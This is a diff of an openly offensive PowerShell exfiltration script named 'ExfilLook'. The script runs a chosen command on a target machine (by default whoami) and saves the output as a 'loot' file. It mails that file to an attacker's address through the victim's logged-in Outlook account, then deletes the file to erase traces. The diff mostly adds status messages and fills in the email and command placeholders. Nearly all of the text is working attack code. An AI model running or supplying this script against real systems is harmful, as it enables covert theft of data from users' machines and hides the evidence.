@@ -13,7 +13,7 @@ __         __   ____   _        ___      __     ____     ______      _____      
 # ---------------------------------------------------------------------------------- #
 
 # The email to send the loot to
-$listenerEmail = ""
+$listenerEmail = "EMAIL"
 
 $emailSubject = "ExfilLook"
 $emailBody = "Proof of Concept"
@@ -22,8 +22,7 @@ $emailBody = "Proof of Concept"
 $filePath = "./loot234289763972623.txt" 
 
 # The commands to fetch the desired information
-$commands = ""
-
+$command = whoami # CHANGE IF NEEDED
 
 # ---------------------------------------------------------------------------------- #
 # Step 2: Test to see if the required processes are enabled on the machine           #
@@ -37,14 +36,14 @@ if (Test-Connection -ComputerName 8.8.8.8 -Count 4 -Quiet) {
     $outlookEnabled = Test-Path -Path $registryPath
 
     if ($outlookEnabled) {
-        #Microsoft Outlook is enabled on this system.
+        Write-Host "[SUCCESS] Microsoft Outlook is enabled on this system" -ForegroundColor DarkGreen
     } else {
-        #ERROR: Microsoft Outlook is not enabled on this system. 
+        Write-Host "[ERROR] Microsoft Outlook is not enabled on this system." -ForegroundColor Red
         exit 1
     }
 
 } else {
-    #ERROR: Machine isn't connected to the Internet.
+    Write-Host "[ERROR] Machine isn't connected to the Internet." -ForegroundColor Red
     exit 1
 }
 
@@ -57,12 +56,12 @@ $outlook = New-Object -ComObject Outlook.Application
 
 # Check if there are any active sessions (logged-in accounts)
 if ($outlook.Session.Accounts.Count -gt 0) {
-    Write-Host "An account is logged in to Outlook."
+    Write-Host "[SUCCESS] An account is logged in to Outlook." -ForegroundColor DarkGreen
     foreach ($account in $outlook.Session.Accounts) {
         # There's an account logged in
     }
 } else {
-    Write-Host "No accounts are currently logged in to Outlook."
+    Write-Host "[ERROR] No accounts are currently logged in to Outlook." -ForegroundColor Red
     exit 1
 }
 
@@ -74,10 +73,10 @@ if ($outlook.Session.Accounts.Count -gt 0) {
 # ---------------------------------------------------------------------------------- #
 
 # Create a new text file
-New-Item -ItemType File -Path $filePath -Force
+New-Item -ItemType File -Path $filePath -Force > $null          
 
 # Execute commands and redirect output to new text file
-$commands > $filePath # FILL OUT
+$command > $filePath 
 
 # ---------------------------------------------------------------------------------- #
 # Step 5: Exfiltrate the text file containing the loot using Outlook                 #
@@ -97,5 +96,8 @@ $outlook.Quit()
 # Step 5: Erase our tracks from the target machine                                   #
 # ---------------------------------------------------------------------------------- #
 
-del $filePath
+del $filePath > $null  
+Write-Host ""
+Write-Host "[SUCCESS] Data exfiltrated successfully." -ForegroundColor Green
+Write-Host "Now exiting ..."
 exit 0
